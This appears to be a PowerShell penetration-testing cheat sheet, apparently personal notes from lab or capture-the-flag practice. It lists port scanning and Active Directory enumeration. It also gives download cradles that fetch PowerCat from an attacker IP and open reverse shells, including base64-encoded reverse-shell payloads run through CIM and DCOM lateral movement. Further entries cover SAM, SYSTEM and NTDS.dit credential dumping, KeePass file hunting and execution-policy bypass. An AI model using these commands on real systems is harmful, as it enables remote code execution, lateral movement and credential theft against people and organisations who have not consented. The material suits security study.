> A task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.

Using `pwsh` on Linux bash
```bash
pwsh
```

Using PowerShell on Windows cmd
```cmd
powershell
```

Start PowerShell with the ExecutionPolicy Bypass
```cmd
powershell -ep bypass
```

Move file
```powershell
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

Copy file
```powershell
copy .\somefile.exe 'C:\Program Files\Enterprise Apps\somefile.exe'
```

Import .ps1 module
```
. .\somemodule.ps1
```
```
Import-Module .\somemodule.ps1
```

#Port_Scanning 

Port scanning via PowerShell E.g., SMB Port 445
```powershell
Test-NetConnection -Port 445 192.168.69.123
```

Automating the PowerShell port scanning
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.69.123", $_)) "TCP port $_ is open"} 2>$null
```

#SMB_Enumeration

Running `net view` to list remote shares
```powershell
net view \\dc01 /all
```

#SMTP_Enumeration 

Port scanning SMTP via PowerShell
```powershell
Test-NetConnection -Port 25 192.168.69.123
```

#File_Sharing

Command to download PowerCat and execute a reverse shell
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.169.123/powercat.ps1");powercat -c 192.168.169.123 -p 4444 -e powershell 
```

Using the `iwr` Cmdlet to download `winPEAS.exe`
```powershell
iwr -uri http://192.168.169.123:80/winPEASx64.exe -Outfile winPEAS64.exe
```

Using wget to download `nc.exe`
```powershell
powershell wget -Uri http://192.168.169.123/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

Download file
```
certutil -urlcache -f http://192.168.169.123:8000/powercat.ps1 powercat.ps1
```

Encode a file to base64 for sending
```powershell
certutil -encode payload.dll payload.b64  
```

Decode a file in base64 after receiving 
```powershell
certutil -decode payload.b64 payload.dll
```

#File_Searching

Searching for password manager (E.g., KeePass) databases on the C drive
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Searching for sensitive information in files in a user's home directory E.g., hentaisalesman
```powershell
Get-ChildItem -Path C:\Users\hentaisalesman\ -Include *kdbx,*log*,*config*,*.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

Recursively list files
```
Get-ChildItem -Recurse
```

List hidden files
```
dir -force
```

#Antivirus_evasion

Changing the ExecutionPolicy for our current user E.g., hentaisalesman
```powershell
Get-ExecutionPolicy -Scope hentaisalesman
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope hentaisalesman
A
Get-ExecutionPolicy -Scope hentaisalesman
```

#Shell_Access #Remote_Access

Create encoded reverse shell
```powershell
$TEXT = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.69.169/powercat.ps1');powercat -c 192.168.69.169 -p 4444 -e powershell"
$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXT))
Write-Output $ENCODED
```
```
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADYAOQAuADEANgA5AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADYAOQAuADEANgA5ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA
```

PowerShell Download Cradle and PowerCat Reverse Shell Execution for shortcut file
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.69.169:8000/powercat.ps1'); powercat -c 192.168.69.169 -p 4444 -e powershell"
```

#Active_Directory_Lateral_Movement #WinRM

Start a PowerShell remoting session via WinRM on `SALESCLIENT69` as `salesadmin`
```powershell
$password = ConvertTo-SecureString "salessalessales123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("salesadmin", $password)
Enter-PSSession -ComputerName SALESCLIENT69 -Credential $cred
```

Establishing a PowerShell Remote Session via WinRM
```powershell
$username = 'waifulover';
$password = 'Sussy123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.69.169 -Credential $credential
```

Interact with the created PowerShell Remote Session with its ID
```
Enter-PSSession 1
```

`Invoke-CimMethod -CimSession` to spawn a process on a remote system
- E.g., UTF16 Encoded PowerShell reverse-shell payload
- Invoke-CimMethod is equivalent to the old WMI cmdlet Invoke-WmiMethod
	- The CIM version uses WSMAN (WinRM) to connect to remote machines
```powershell
$username = 'waifulover';
$password = 'Sussy123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.69.169 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYAOQAuADEANgA5ACIALAA2ADkANgA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

Remotely Instantiating the MMC Application object E.g., on 192.168.169.69
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.169.69"))
```
- _Microsoft Management Console_ (MMC) COM application is meant for scripted automation of Windows systems.
	- Allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property.
		- ExecuteShellCommand allows execution of any shell command 
			- As long as the authenticated user is authorized (default for local administrators)

Executing a command on the remote DCOM object to spawn a powershell reverse-shell as a DCOM payload
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYAOQAuADEANgA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==","7")
```
- ExecuteShellCommand
	- `cmd`
		- Command
	- `$null`
		- Directory
	- `/c calc`
		- Parameters
	- `7`
		- WindowState

#Password_Attacks #Windows_Enumeration #Windows_Privilege_Escalation  #Client_Side 

Show the list of commands entered during the current session
```powershell
Get-History
```

Show path of the history file from PSReadline
```powershell
(Get-PSReadlineOption).HistorySavePath
```

Show the contents of `ConsoleHost_history.txt`
```powershell
type C:\Users\salesman\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Show all local users
```powershell
Get-LocalUser
```
```powershell
net user
```

Show local groups of a specific user E.g., `salesman`
```powershell
net user salesman
```

Show all local groups
```powershell
Get-LocalGroup
```

Show members of a specific group 
```powershell
Get-LocalGroupMember Administrators
```

Show hostname
```
hostname
```

Show username of current user
```powershell
whoami
```

Show group memberships of the current user
```powershell
whoami /groups
```

Show privileges
```powershell
whoami /priv
```

Show information about the operating system and architecture
```powershell
systeminfo
```
```powershell
Get-ComputerInfo
```

Show information about the TCP/IP configuration
```powershell
ipconfig /all
```

Show routing table
```powershell
route print
```

Show active network connections
```powershell
netstat -ano
```
```powershell
netstat -ano | find "2222"
```

Show running processes
```powershell
Get-Process
```
```powershell
tasklist
```

Get path of running processes
```powershell
Get-Process | Select-Object Path
```

Show installed 32-bit applications in the _Windows Registry_ with the `Get-ItemProperty`
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
```

Show installed 64-bit applications in the _Windows Registry_ with the `Get-ItemProperty`
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
```

Pipe to search (grep)
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select-string "flag{"
```

Using Runas to execute cmd as user salesadmin
```powershell
runas /user:salesadmin cmd
```

Run cmd as a different user with secure string password
```
$username = 'weebpolice'
$password = 'T3hWeEbC@tcH3r123'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Start-Process cmd.exe -Credential $credential
```
- Output looks very broken but it works

Run command as a different user with secure string password
```
$username = 'weebpolice'
$password = 'Th3wEebC@tCh3r123'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Start-Process cmd.exe -Credential $credential -ArgumentList "/c whoami"
Start-Process cmd.exe -Credential $credential -ArgumentList "/c hostname"
Start-Process cmd.exe -Credential $credential -ArgumentList "/c ipconfig"
Start-Process cmd.exe -Credential $credential -ArgumentList "/c type C:\Users\Administrator\Desktop\flag.txt"
```
- specify the parameter `/c` or `/k` to carry out the command

Show installed Windows services
```powershell
Get-Service
```

Show installed services with binary path
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

Show running services with binary path
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
```powershell
Get-WmiObject -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Show running processes
```powershell
Get-CimInstance -ClassName Win32_Process
```

Show DCOM applications
```
Get-CimInstance -ClassName Win32_DCOMApplication
```

Get Startup Type for specific service E.g., `mysql`
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
- If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

Show the applications or scripts that are set to run automatically on boot
```powershell
wmic startup get caption,command
```
```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

Show list of services with spaces and missing quotes in the binary path
```powershell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "C:\Windows\*"} | Where-Object {$_.PathName -notlike "*""*"} | Select-Object Name, PathName
```

Show permissions of file
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```
```powershell
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

Show permissions on directory E.g., `Enterprise Apps`
```powershell
icacls "C:\Program Files\Enterprise Apps"
```

Show all the environment variables
```powershell
dir env:
```

Show the PATH environment variable to view the Windows DLL search order
```powershell
$env:path
```

Display a list of all scheduled tasks
```powershell
schtasks /query /fo LIST /v
```

#Windows_Privilege_Escalation 

Start Service E.g., `AlphaService`
```powershell
Start-Service AlphaService
```

Restarting Service E.g., `BetaService`
```powershell
Restart-Service BetaService
```

Stop Service E.g., `GammaService`
```powershell
Stop-Service GammaService
```

Rebooting the machine
```powershell
shutdown /r /t 0
```

#Active_Directory_Enumeration 

Show SID of current user
- Domain SID is part of current user SID
```
whoami /user
```

Display users in the domain
```powershell
net user /domain
```

Show domain groups of a specific user E.g., `salesadmin`
```powershell
net user salesadmin /domain
```

Show groups in the domain
```powershell
net group /domain
```

Show members in specific domain group E.g., `Sales Department`
```powershell
net group "Sales Department" /domain
```

Add user to specific domain group
```
net group "Weeb Department" hentaiuser /add /domain
```

Remove user to specific domain group
```
net group "Weeb Department" hentaiuser /del /domain
```

Show the account policy
```
net accounts
```

Using the `iwr` Cmdlet to access the web page on web69
```powershell
iwr -UseDefaultCredentials http://web69
```

Displaying permissions on the DefaultSecurity registry hive
```powershell
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

Create Windows PowerShell session on a local or remote computer
```powershell
$Session = New-PSSession -ComputerName susmachine01
Enter-PSSession -Session $Session
Invoke-Command -Session $session -ScriptBlock { Get-Process }
```
```powershell
Enter-PsSession -ComputerName susmachine01
```

Listing SPN (service principal name) linked to a certain user account
```powershell
setspn -L iis_service
```

Resolving the SPN (service principal name)
```powershell
nslookup.exe web69.hentai.com
```

Listing contents of domain share E.g., SYSVOL share
```powershell
ls \\dc1.hentai.com\sysvol\hentai.com\
```

Extract the NTDS database to the C: drive
```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\Tools\ntds.dit.bak
```

#NTLM_Hash

Extract the SYSTEM hive from the Windows registry
```powershell
reg.exe save hklm\system c:\system.bak
```

Get SYSTEM and SAM hive files using reg
```powershell
reg save hklm\system system
reg save hklm\sam sam
```

## PowerShell Scripts

Automate building the required LDAP path
`enumeration.ps1`
```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```
- LDAP path format
	- `LDAP://HostName[:PortNumber][/DistinguishedName]`
		- _Hostname_ can be a computer name, IP address or a domain name
			- Look for the _Primary Domain Controller_ (PDC)
				- DC holding the _PdcRoleOwner_ property
		- _PortNumber_ for the LDAP connection is optional
			- It will automatically choose the port 
				- Based on whether or not we are using an SSL connection
			- if a domain using non-default ports, manually add this
		- _DistinguishedName_ (DN)
			- Is a part of the LDAP path. 
				- A DN is a name that uniquely identifies an object in AD, including the domain itself
					- E.g., `CN=Hentaisalesman,CN=Users,DC=corp,DC=com`
						- "CN" refers to the _Common Name_
						- "DC" refers to the Domain Controller
						- When reading a DN, we start with the Domain Component objects on the right side and move to the left
							- _DC=com_ represents the top of an LDAP tree
							- _CN=Hentaisalesman_ represents the Common Name for the user object itself, which is also lowest in the hierarchy.
Oneliner for above script
```powershell
"LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name)/$(([adsi]'').distinguishedName)"
```

Automate retrieval and property display of any property of any object type E.g., Active Directory users
`enumeration.ps1`
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```
Oneliner for above script
```powershell
(New-Object System.DirectoryServices.DirectorySearcher((New-Object System.DirectoryServices.DirectoryEntry("LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name)/$(([adsi]'').distinguishedName)")),"samAccountType=805306368")).FindAll() | ForEach-Object { $_.Properties | ForEach-Object { $_ }; Write-Host "-------------------------------" }
```

Automate retrieval and property display of any property of any object type E.g., Only show groups salesadmin is a member of
`enumeration.ps1`
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="name=salesadmin"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }

    Write-Host "-------------------------------"
}
```
Oneliner for above script
```powershell
foreach ($obj in (New-Object System.DirectoryServices.DirectorySearcher((New-Object System.DirectoryServices.DirectoryEntry("LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name)/$(([adsi]'').distinguishedName)")),"name=salesadmin")).FindAll()) { foreach ($prop in $obj.Properties) { $prop.memberof }; Write-Host "-------------------------------" }
```

## PowerShell Functions

### LDAPSearch
Automate retrieval and property display of any property of any object type
`function.ps1`
```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

Use LDAPSearch function to show AD users
```powershell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
```

Use LDAPSearch function to show all the groups in the domain
```powershell
LDAPSearch -LDAPQuery "(objectclass=group)"
```

Use LDAPSearch function to show every group in the domain and the user members
```powershell
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member} }
```

Use LDAPSearch function to show attributes on group object
```powershell
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department*))"
$group.Properties
$group.Properties.member
$group.Properties.memberof
```

Use LDAPSearch function to show attributes on user object
```powershell
$user = LDAPSearch -LDAPQuery "(&(objectCategory=user)(cn=hentaisalesman*))"
$user.Properties
$user.properties.memberof
```

References:
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh?view=powershell-7.3#-noprofile---nop